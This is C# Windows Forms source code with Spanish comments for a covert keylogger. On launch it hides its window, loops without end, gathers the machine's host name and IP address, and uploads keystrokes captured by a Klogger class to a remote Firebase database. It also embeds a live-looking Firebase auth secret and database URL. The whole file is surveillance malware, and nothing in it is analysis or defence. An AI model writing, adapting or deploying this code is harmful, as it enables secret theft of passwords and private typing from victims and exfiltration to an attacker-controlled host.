//Usamos las propiaedades del sistema C#
using System;
//libreria que nos permite acceder a algunas propiadades del sistema windows
using System.Net;
//libreria que permite el uso de interfaces interactivas con el usuario
using System.Windows.Forms;
//nos permite establecer una conexion con firebase
using FireSharp.Config;
//nos permite gestionar los datos de firebase
using FireSharp.Interfaces;
//Se declara el nombre del proyecto para esta clase
namespace WinFormsApp2
{
    //Se declara el nombre de la clase
    public partial class Form1 : Form
    {
        //se inicia el formulario de inteacción con el usuario
        public Form1()
        {
            //se inicia las propiedades del formulario
            InitializeComponent();
        }
        //declaramos la funcionvariable donde guardamos la credenciales de firebase
        IFirebaseConfig config = new FirebaseConfig()
        {
            //es la clave token para firebase
            AuthSecret = "B0fCGHAx4Ekri060GnxDHRClP9U2hD5a60a6vXE8",
            //es el elnace de host de nuestra base de datos
            BasePath= "https://logger333-cade9-default-rtdb.firebaseio.com/"
        };
        //nos declaramos como clientes para gestionar los datos de firebase
        IFirebaseClient client;
        //funcion que se ejecuta para que la intefaz del usuario puede ser visible
        private void Form1_Load(object sender, EventArgs e)
        {
            //iniciamos bicle infinito
            while (true)
            {
                //ocultamos la interfaz para que se ejecute en segundo plano
                this.Hide();
                //guardamos es un variable la fecha y la hora actuales
                string momento = DateTime.Now.ToString("dd MM yyyy") + "-" + DateTime.Now.ToString("HH:mm:ss");
                //declaramos una veriable para guardar el nombre de la pc
                string strHostName = string.Empty;
                //obtenemos y guardamos el nombre de la pc
                strHostName = Dns.GetHostName();
                //obtenemos los detalle de la ip del equipo
                IPAddress[] hostIPs = Dns.GetHostAddresses(strHostName);
                //declaramos 2 variables para poder limpiar el texto recibido de la ip de la pc
                string ip = "", ipf = "";
                //iniciamos un bucle para poder conseguir la ip actual de la pc y hacer la primera face de limpieza
                for (int i = 0; i < hostIPs.Length; i++)
                {
                    //guardamos la ip
                    ip = "IP:" + hostIPs[i].ToString();
                }
                //llamamos a la clase Klogger donde se encuantr ael keylogger
                Klogger dat = new Klogger();
                //enviamos las credenciales a firebase
                client = new FireSharp.FirebaseClient(config);
                //iniciamos otro bucle para la segunda face de la limpieza de la ip, ya que firebase no admite (.) para cammbiarlo por (-)
                for(int i=0; i < ip.Length; i++)
                {
                    //verificamos si existe un (.)
                    if (ip[i] == '.')
                    {
                        //si existe un(.) se reemplaza por un (-)
                        ipf = ipf + "-";
                    }
                    //si no existe un (.) entonces gurdamos la ip
                    else
                    {
                        //cuardamos la ip
                        ipf = ipf + ip[i];
                    }
                }
                //concatenamos el nombre de la pc y la ip
                string name = ipf + "-" + strHostName;
                //enviamos y guardamos los datos
                var seter = client.Set("keylogger/" + name + "/" + momento + "/", dat.Captura);
            }
        }
    }
}
